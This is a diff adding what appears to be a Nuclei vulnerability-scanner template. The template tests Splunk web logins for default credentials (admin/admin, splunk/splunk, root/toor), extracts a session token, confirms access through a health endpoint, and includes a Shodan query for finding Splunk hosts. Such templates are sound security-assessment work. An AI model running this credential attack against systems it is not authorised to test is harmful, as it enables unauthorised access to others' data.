@@ -1,0 +1,73 @@
+id: splunk-default-login
+
+info:
+  name: Splunk - Default Password
+  author: pussycat0x
+  severity: high
+  description: |
+    Splunk Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.
+  classification:
+    cpe: cpe:2.3:a:splunk:splunk:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 9
+    vendor: splunk
+    product: splunk
+    shodan-query: http.title:"Splunk"
+  tags: default-login,splunk
+
+http:
+  - raw:
+      - |
+        GET /en-US/account/login?return_to=%2Fen-US%2Faccount%2F HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /en-US/account/login HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Referer: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Origin: {{BaseURL}}
+
+        {{cval}}&username={{username}}&password={{password}}&return_to=%2Fen-US%2F&set_has_logged_in=false
+      - |
+        GET /en-US/splunkd/__raw/services/server/health/splunkd?output_mode=json&_= HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Referer: {{BaseURL}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - "admin"
+        - "splunk"
+        - "root"
+      password:
+        - "admin"
+        - "splunk"
+        - "toor"
+    stop-at-first-match: true
+    host-redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_3
+        words:
+          - "splunkd"
+          - "updated"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        internal: true
+        name: cval
+        part: header
+        regex:
+          - 'cval=([0-9]+)'
+# digest: 4b0a00483046022100db634e4b0806d880252a31d2d4e70d3153b59979a4aef2053d6bbfc3bed6217e022100e399b9342bd8e069ee1f70d798b8c4149ad4cabd696c10c162744286ef78ba90:922c64590222798bb761d5b6d8e72950
